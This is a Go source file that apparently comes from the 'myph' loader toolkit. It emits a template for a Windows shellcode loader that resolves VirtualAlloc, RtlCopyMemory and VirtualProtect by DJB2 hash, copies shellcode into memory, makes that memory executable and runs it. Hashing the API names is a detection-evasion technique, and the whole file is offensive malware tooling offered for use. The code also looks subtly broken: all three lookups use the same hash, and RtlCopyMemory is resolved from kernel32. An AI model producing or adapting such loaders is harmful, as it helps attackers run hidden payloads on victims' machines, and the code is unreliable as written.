package loaders

import (
	"fmt"
)

func GetSyscallAPIHashTemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)

	return fmt.Sprintf(`
package main

import (
        "syscall"
        "unsafe"
    "fmt"
    "os"

    loader "github.com/cmepw/myph/internals"
        "github.com/Binject/debug/pe"
)

const (
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READ = 0x20
        PAGE_READWRITE = 0x04
)

func ExecuteOrderSixtySix(shellcode []byte) {

    kernel32, err := pe.Open("C:\\Windows\\System32\\kernel32.dll"); if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }
    defer kernel32.Close()


    virtualAllocPtr, err := loader.LoadFunctionFromHash(loader.HashDJB2, "782024e6b5fe6881", kernel32)
    if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }

    virtualAlloc := *(*loader.VirtualAlloc)(unsafe.Pointer(&virtualAllocPtr))
        addr, _ := virtualAlloc(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)


    ntdll, err := pe.Open("C:\\Windows\\System32\\ntdll.dll"); if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }
    defer ntdll.Close()

    rtlCopyMemoryPtr, err := loader.LoadFunctionFromHash(loader.HashDJB2, "782024e6b5fe6881", kernel32)
    if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }

    rtlCopyMemory := *(*loader.RtlCopyMemory)(unsafe.Pointer(&rtlCopyMemoryPtr))
    _, _ = rtlCopyMemory(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))


    virtualProtectPtr, err := loader.LoadFunctionFromHash(loader.HashDJB2, "782024e6b5fe6881", kernel32)
    if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }

    oldProtect := PAGE_READWRITE
    virtualProtect := *(*loader.VirtualProtect)(unsafe.Pointer(&virtualProtectPtr))
        _, _ = virtualProtect(
        addr,
        uintptr(len(shellcode)),
        PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&oldProtect)),
    )

        _, _, _ = syscall.SyscallN(addr)

}

    `)
}
